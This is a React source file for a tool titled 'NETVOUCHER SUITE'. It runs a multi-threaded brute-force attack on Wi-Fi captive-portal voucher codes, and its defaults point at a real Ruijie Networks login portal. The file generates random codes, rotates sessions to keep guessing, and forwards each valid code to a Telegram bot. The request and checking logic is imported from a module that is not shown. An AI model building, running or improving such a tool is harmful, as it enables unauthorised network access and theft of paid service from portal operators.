import React, { useState, useEffect, useCallback, useRef } from 'react';
import { 
  Play, Square, Settings, Activity, 
  Wifi, Shield, Key, Database, Zap, 
  Monitor, Lock, Globe, Layers, Download
} from 'lucide-react';
import ConsoleLog from './components/ConsoleLog';
import StatCard from './components/StatCard';
import { Config, LogEntry, ScanStats, SessionSlot, ValidCode } from './types';
import { fetchSessionId, generateAccessCode, checkCode, sendTelegramAlert } from './services/scannerLogic';

const DEFAULT_CONFIG: Config = {
  targetUrl: 'https://portal-as.ruijienetworks.com',
  telegramBotToken: '',
  telegramChatId: '',
  threadCount: 20,
  simulationMode: true,
  useNumbers: true,
  useLowercase: true, 
  codeLength: 6,
  codePrefix: '',
  loginUrl: 'https://portal-as.ruijienetworks.com/auth/wifidogAuth/login/?gw_id=105f025095cc'
};

const MAX_LOGS = 100;

// -- Styled UI Components --

const TabButton = ({ active, onClick, label, icon: Icon }: any) => (
    <button 
        onClick={onClick}
        className={`flex items-center gap-2 px-4 py-2 text-xs font-medium rounded-t-lg transition-colors border-t border-x ${
            active 
            ? 'bg-[#0f172a] border-slate-700 text-blue-400' 
            : 'bg-[#020617] border-transparent text-slate-500 hover:text-slate-300'
        }`}
    >
        <Icon className="w-3.5 h-3.5" />
        {label}
    </button>
);

const InputGroup = ({ label, children }: { label: string, children?: React.ReactNode }) => (
    <div className="space-y-1.5">
        <label className="text-[10px] font-bold text-slate-500 uppercase tracking-wider">{label}</label>
        {children}
    </div>
);

const StyledInput = (props: React.InputHTMLAttributes<HTMLInputElement>) => (
    <input 
        {...props}
        className="w-full bg-[#020617] border border-slate-800 rounded px-3 py-2 text-xs text-slate-300 font-mono focus:outline-none focus:border-blue-500 transition-colors placeholder:text-slate-700"
    />
);

const ToggleSwitch = ({ checked, onChange }: { checked: boolean, onChange: (v: boolean) => void }) => (
    <button 
        onClick={() => onChange(!checked)}
        className={`w-10 h-5 rounded-full relative transition-colors ${checked ? 'bg-blue-600' : 'bg-slate-700'}`}
    >
        <div className={`absolute top-1 w-3 h-3 rounded-full bg-white transition-all duration-200 ${checked ? 'left-6' : 'left-1'}`} />
    </button>
);

export default function App() {
  // --- State Management ---
  const [isRunning, setIsRunning] = useState(false);
  const [config, setConfig] = useState<Config>(DEFAULT_CONFIG);
  const [activeTab, setActiveTab] = useState<'general' | 'codes' | 'telegram'>('general');
  const [stats, setStats] = useState<ScanStats>({ attempts: 0, validFound: 0, sessionsActive: 0, startTime: null });
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [validCodes, setValidCodes] = useState<ValidCode[]>([]);
  const [activeSessions, setActiveSessions] = useState<SessionSlot[]>([]);

  const sessionsRef = useRef<SessionSlot[]>([]);
  const isRunningRef = useRef(false);

  // --- Persistence ---
  useEffect(() => {
    const saved = localStorage.getItem('netvoucher_v2_config');
    if (saved) {
        try { setConfig({ ...DEFAULT_CONFIG, ...JSON.parse(saved) }); } catch(e) {}
    }
  }, []);

  useEffect(() => {
    localStorage.setItem('netvoucher_v2_config', JSON.stringify(config));
  }, [config]);

  // --- Logging ---
  const addLog = useCallback((message: string, type: LogEntry['type'] = 'info') => {
    setLogs(prev => [...prev.slice(-MAX_LOGS), {
      id: Math.random().toString(36).substr(2, 9),
      timestamp: new Date().toLocaleTimeString('en-US', {hour12: false}),
      message,
      type
    }]);
  }, []);

  // --- Logic Engine ---
  const manageSessions = useCallback(async () => {
    if (!isRunningRef.current) return;
    const targetSessions = Math.max(1, Math.floor(config.threadCount / 2));
    
    if (sessionsRef.current.length < targetSessions) {
      const sid = await fetchSessionId(config);
      if (sid) {
        sessionsRef.current.push({ id: Math.random().toString(), sessionId: sid, remainingUses: 40 });
        addLog(`[System] New session allocated: [SID: ${sid}]`, 'info');
      } else {
        await new Promise(r => setTimeout(r, 2000));
        addLog('[System] Failed to acquire session. Retrying...', 'warning');
      }
    }
    setStats(p => ({...p, sessionsActive: sessionsRef.current.length}));
    setActiveSessions([...sessionsRef.current]);
    if (isRunningRef.current) setTimeout(manageSessions, 1000);
  }, [config, addLog]);

  const spawnWorker = useCallback(async (workerId: number) => {
    if (!isRunningRef.current) return;
    if (sessionsRef.current.length === 0) { setTimeout(() => spawnWorker(workerId), 500); return; }

    const sessionSlot = sessionsRef.current[Math.floor(Math.random() * sessionsRef.current.length)];
    if (!sessionSlot) { setTimeout(() => spawnWorker(workerId), 100); return; }

    const code = generateAccessCode(config);
    const result = await checkCode(code, sessionSlot.sessionId, config);

    setStats(p => ({...p, attempts: p.attempts + 1}));

    if (result.valid) {
      addLog(`[Found] Access Granted: ${code}`, 'success');
      const newValid = { code, timestamp: new Date().toLocaleTimeString(), sessionId: sessionSlot.sessionId };
      setValidCodes(p => [...p, newValid]);
      setStats(p => ({...p, validFound: p.validFound + 1}));
      await sendTelegramAlert(code, sessionSlot.sessionId, config);
    } else if (result.status === 401 || result.message.includes('timeout')) {
       sessionsRef.current = sessionsRef.current.filter(s => s.id !== sessionSlot.id);
    } else {
       sessionSlot.remainingUses--;
       if (sessionSlot.remainingUses <= 0) sessionsRef.current = sessionsRef.current.filter(s => s.id !== sessionSlot.id);
    }
    
    // Slight jitter to prevent browser lockup
    setTimeout(() => spawnWorker(workerId), Math.random() * 20);
  }, [config, addLog]);

  const toggleScan = () => {
    if (isRunning) {
        setIsRunning(false);
        isRunningRef.current = false;
        addLog('[System] Operation halted by user.', 'warning');
    } else {
        setIsRunning(true);
        isRunningRef.current = true;
        setStats(p => ({...p, startTime: Date.now()}));
        addLog(`[System] Initializing brute-force sequence. Threads: ${config.threadCount}`, 'info');
        manageSessions();
        for(let i=0; i < config.threadCount; i++) setTimeout(() => spawnWorker(i), i * 30);
    }
  };

  // --- Render Helpers ---
  const getSpeed = () => {
    if (!stats.startTime) return 0;
    const s = (Date.now() - stats.startTime) / 1000;
    return s > 0 ? Math.round(stats.attempts / s) : 0;
  };

  const downloadData = () => {
    const txt = validCodes.map(v => `${v.timestamp} | Code: ${v.code} | Session: ${v.sessionId}`).join('\n');
    const url = URL.createObjectURL(new Blob([txt], { type: 'text/plain' }));
    const a = document.createElement('a');
    a.href = url; a.download = 'scan_results.txt'; a.click();
  };

  return (
    <div className="min-h-screen p-4 md:p-6 flex flex-col gap-6 max-w-7xl mx-auto">
      
      {/* Header */}
      <header className="flex items-center justify-between border-b border-slate-800 pb-4">
        <div className="flex items-center gap-3">
            <div className="p-2 bg-blue-600 rounded-lg">
                <Shield className="w-5 h-5 text-white" />
            </div>
            <div>
                <h1 className="text-lg font-bold text-slate-100 tracking-tight">NETVOUCHER <span className="text-slate-500 font-light">SUITE</span></h1>
                <div className="flex items-center gap-2 text-[10px] font-mono text-slate-500">
                    <span className={`w-1.5 h-1.5 rounded-full ${isRunning ? 'bg-emerald-500 animate-pulse' : 'bg-red-500'}`}></span>
                    STATUS: {isRunning ? 'RUNNING' : 'IDLE'}
                </div>
            </div>
        </div>
        <div className="flex items-center gap-4">
            <div className="hidden md:flex flex-col items-end text-[10px] text-slate-500 font-mono">
                <span>VERSION 2.0.4</span>
                <span>BUILD: STABLE</span>
            </div>
        </div>
      </header>

      {/* Main Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 flex-1">
        
        {/* Left Panel: Settings (4 Cols) */}
        <div className="lg:col-span-4 flex flex-col bg-[#0f172a] border border-slate-800 rounded-xl overflow-hidden">
             {/* Tab Header */}
             <div className="flex bg-[#020617] border-b border-slate-800 px-2 pt-2 gap-1">
                <TabButton active={activeTab === 'general'} onClick={() => setActiveTab('general')} label="Network" icon={Wifi} />
                <TabButton active={activeTab === 'codes'} onClick={() => setActiveTab('codes')} label="Payload" icon={Key} />
                <TabButton active={activeTab === 'telegram'} onClick={() => setActiveTab('telegram')} label="Alerts" icon={Zap} />
             </div>

             {/* Tab Content */}
             <div className="p-5 flex-1 space-y-5 overflow-y-auto">
                {activeTab === 'general' && (
                    <div className="space-y-4 animate-in fade-in duration-300">
                        <InputGroup label="Target Login URL">
                            <div className="relative">
                                <Globe className="absolute left-3 top-2.5 w-4 h-4 text-slate-600" />
                                <StyledInput 
                                    className="pl-9"
                                    value={config.loginUrl}
                                    onChange={e => setConfig({...config, loginUrl: e.target.value})}
                                    placeholder="https://portal.../?gw_id=..."
                                />
                            </div>
                            <p className="text-[10px] text-slate-600">Session ID is extracted from this URL.</p>
                        </InputGroup>

                        <InputGroup label="Base API URL">
                            <StyledInput 
                                value={config.targetUrl}
                                onChange={e => setConfig({...config, targetUrl: e.target.value})}
                            />
                        </InputGroup>

                        <div className="grid grid-cols-2 gap-4">
                            <InputGroup label="Threads">
                                <StyledInput 
                                    type="number"
                                    value={config.threadCount}
                                    onChange={e => setConfig({...config, threadCount: Number(e.target.value)})}
                                />
                            </InputGroup>
                             <InputGroup label="Simulation">
                                <div className="h-[34px] flex items-center">
                                    <div className="flex items-center gap-3">
                                        <ToggleSwitch 
                                            checked={config.simulationMode} 
                                            onChange={v => setConfig({...config, simulationMode: v})} 
                                        />
                                        <span className={`text-xs ${config.simulationMode ? 'text-blue-400' : 'text-slate-500'}`}>
                                            {config.simulationMode ? 'Enabled' : 'Disabled'}
                                        </span>
                                    </div>
                                </div>
                            </InputGroup>
                        </div>
                    </div>
                )}

                {activeTab === 'codes' && (
                    <div className="space-y-4 animate-in fade-in duration-300">
                         <div className="p-3 bg-slate-900 rounded border border-slate-800">
                            <label className="text-xs font-semibold text-slate-400 block mb-2">Character Set</label>
                            <div className="space-y-2">
                                <label className="flex items-center justify-between text-xs text-slate-300 cursor-pointer hover:bg-slate-800 p-1.5 rounded">
                                    <span>Numeric (0-9)</span>
                                    <ToggleSwitch checked={config.useNumbers} onChange={v => setConfig({...config, useNumbers: v})} />
                                </label>
                                <label className="flex items-center justify-between text-xs text-slate-300 cursor-pointer hover:bg-slate-800 p-1.5 rounded">
                                    <span>Lowercase (a-z)</span>
                                    <ToggleSwitch checked={config.useLowercase} onChange={v => setConfig({...config, useLowercase: v})} />
                                </label>
                            </div>
                         </div>

                         <InputGroup label="Code Length">
                            <StyledInput 
                                type="number"
                                min={1} max={20}
                                value={config.codeLength}
                                onChange={(e) => {
                                    let v = parseInt(e.target.value);
                                    if (v < 1) v = 1; if (v > 20) v = 20;
                                    setConfig({...config, codeLength: v})
                                }}
                            />
                         </InputGroup>

                          <InputGroup label="Prefix (Optional)">
                            <StyledInput 
                                value={config.codePrefix}
                                onChange={e => setConfig({...config, codePrefix: e.target.value})}
                                placeholder="e.g. USER-"
                            />
                         </InputGroup>
                    </div>
                )}

                {activeTab === 'telegram' && (
                    <div className="space-y-4 animate-in fade-in duration-300">
                        <InputGroup label="Bot Token">
                            <StyledInput 
                                type="password"
                                value={config.telegramBotToken}
                                onChange={e => setConfig({...config, telegramBotToken: e.target.value})}
                            />
                        </InputGroup>
                         <InputGroup label="Chat ID">
                            <StyledInput 
                                value={config.telegramChatId}
                                onChange={e => setConfig({...config, telegramChatId: e.target.value})}
                            />
                        </InputGroup>
                        <div className="text-[10px] text-slate-600 bg-slate-900 p-2 rounded">
                            Valid codes will be sent immediately upon discovery.
                        </div>
                    </div>
                )}
             </div>

             {/* Action Bar */}
             <div className="p-4 border-t border-slate-800 bg-[#020617]">
                <button 
                    onClick={toggleScan}
                    className={`w-full py-3 rounded font-bold tracking-wider text-sm flex items-center justify-center gap-2 transition-all ${
                        isRunning 
                        ? 'bg-red-900/50 text-red-400 border border-red-900 hover:bg-red-900/80' 
                        : 'bg-blue-600 text-white hover:bg-blue-500 shadow-lg shadow-blue-900/20'
                    }`}
                >
                    {isRunning ? <Square className="w-4 h-4 fill-current" /> : <Play className="w-4 h-4 fill-current" />}
                    {isRunning ? 'ABORT OPERATION' : 'START SCANNER'}
                </button>
             </div>
        </div>

        {/* Center Panel: Stats & Terminal (5 Cols) */}
        <div className="lg:col-span-5 flex flex-col gap-4">
             {/* Stats Row */}
             <div className="grid grid-cols-2 gap-4">
                <StatCard label="Total Attempts" value={stats.attempts.toLocaleString()} icon={<Activity className="w-4 h-4" />} active={isRunning} />
                <StatCard label="Speed (Req/s)" value={getSpeed()} icon={<Zap className="w-4 h-4" />} />
             </div>

             {/* Terminal */}
             <div className="flex-1 min-h-[400px]">
                <ConsoleLog logs={logs} />
             </div>
        </div>

        {/* Right Panel: Data (3 Cols) */}
        <div className="lg:col-span-3 flex flex-col gap-4 h-full">
            {/* Valid Codes Card */}
            <div className="flex-1 bg-[#0f172a] border border-slate-800 rounded-xl flex flex-col overflow-hidden">
                <div className="px-4 py-3 border-b border-slate-800 bg-[#020617] flex items-center justify-between">
                    <span className="text-xs font-bold text-slate-400 uppercase">Valid Hits ({validCodes.length})</span>
                    <button onClick={downloadData} disabled={validCodes.length === 0} className="text-slate-500 hover:text-blue-400 disabled:opacity-30">
                        <Download className="w-4 h-4" />
                    </button>
                </div>
                <div className="flex-1 overflow-y-auto p-2 space-y-2 custom-scrollbar">
                    {validCodes.map((vc, i) => (
                        <div key={i} className="bg-emerald-500/10 border border-emerald-500/20 p-2 rounded">
                            <div className="text-emerald-400 font-mono font-bold">{vc.code}</div>
                            <div className="text-[10px] text-slate-500 truncate">{vc.sessionId}</div>
                        </div>
                    ))}
                    {validCodes.length === 0 && <div className="text-center text-[10px] text-slate-700 mt-10">No matches found yet.</div>}
                </div>
            </div>

            {/* Session Pool Card */}
            <div className="h-1/3 bg-[#0f172a] border border-slate-800 rounded-xl flex flex-col overflow-hidden">
                <div className="px-4 py-3 border-b border-slate-800 bg-[#020617] flex items-center justify-between">
                    <span className="text-xs font-bold text-slate-400 uppercase">Active Sessions ({activeSessions.length})</span>
                    <Layers className="w-4 h-4 text-slate-600" />
                </div>
                <div className="flex-1 overflow-y-auto p-2 space-y-1 custom-scrollbar">
                    {activeSessions.map((s) => (
                        <div key={s.id} className="flex items-center justify-between bg-slate-900 px-2 py-1.5 rounded border border-slate-800">
                             <span className="text-[10px] font-mono text-blue-300 w-24 truncate">{s.sessionId}</span>
                             <div className="h-1.5 w-16 bg-slate-800 rounded-full overflow-hidden">
                                <div className="h-full bg-blue-500" style={{width: `${(s.remainingUses/40)*100}%`}} />
                             </div>
                        </div>
                    ))}
                </div>
            </div>
        </div>

      </div>
    </div>
  );
}